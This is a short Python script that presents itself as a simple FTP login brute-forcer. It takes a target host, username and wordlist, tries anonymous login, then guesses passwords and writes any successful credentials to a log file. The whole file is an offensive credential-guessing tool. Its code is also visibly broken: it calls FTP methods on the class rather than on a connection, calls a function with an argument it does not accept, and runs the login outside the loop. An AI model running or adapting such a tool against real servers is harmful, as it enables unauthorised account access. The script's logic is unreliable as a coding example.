#!/usr/bin/python
# Simple ftp login bruteforcer
# ToDo: proxy, time reference, verbose mode, threading

import sys
import socket
import re
import io
from ftplib import FTP

password = "password.log"

options = '''
Usage: ./ftpbrute.py [options]
options: -t --target   <host>
         -u --user     <user>
         -w --wordlist <words>
         -h --help     <help>

Example: ./ftpbrute.py -t 192.168.1.0 -u admin -w wordlist.txt

'''


file = open(password, "a")

def banner():
    print (options)
    file.write(options)
    sys.exit(1)

# Parse script arguments
for arg in sys.argv:
    if arg.lower() == '-t' or arg.lower() == '--target':
        host = sys.argv[int(sys.argv[1:].index(arg))+2]
    elif arg.lower() == '-u' or arg.lower() == '--user':
        user = sys.argv[int(sys.argv[1:].index(arg))+2]
    elif arg.lower() == '-w' or arg.lower() == '--wordlist':
    	words= sys.argv[int(sys.argv[1:].index(arg))+2]
    elif arg.lower() == 'h' or arg.lower() == '--help':
        print (banner())
    elif len(sys.argv) < 3:
        print (banner())

# Check for anonymous login
def anoncheck():
    try:
        print ("Trying anonymous login...\n")
        ftp = FTP(host)         # connect to host, default port
        FTP.login()        # user anonymous, passwd anonymous@
        FTP.retrlines('LIST')    # list directory contents
        print ("Anonymous login allowed!\n")
        FTP.quit()
    except(IOError):
        print ("Anonymous login failed\n")
        pass

# Dictionary attack
def dictionary():
    print ("Starting Dictionary attack")
    sys.stdout.write("\rTrying: %s" % (words))
    file.write("\nTrying: "+words)
try:
    print ("Trying dictionary attack...")
    ftp = FTP(host)
    FTP.login(sys.argv[2], sys.argv[3])
    FTP.retrlines('LIST')
    FTP.quit()
    print ("\nPassword found!\n")
    print ("\nUsername: ",user,"")
    print ("\nPassword: ",words,"")
    file.write("\nSuccessful login!")
    file.write("\nUsername: ,"+user)
    file.write("\nPassword: ,"+words)
    sys.exit(1)
except KeyboardInterrupt:
    print ("\nUser sent kill signal\n")
    file.write("\nUser sent kill signal\n")

try:
    anoncheck()
except(IOError):
    print ("Anonymous login process not avialable")
    sys.exit(1)

# Wordlist iteration
try:
    for line in open(sys.argv[3]):
        for word in line.split():
            dictionary(word)
except(IOError):
    print ("Invalid wordlist path\n")
    sys.exit(1)

file.close()


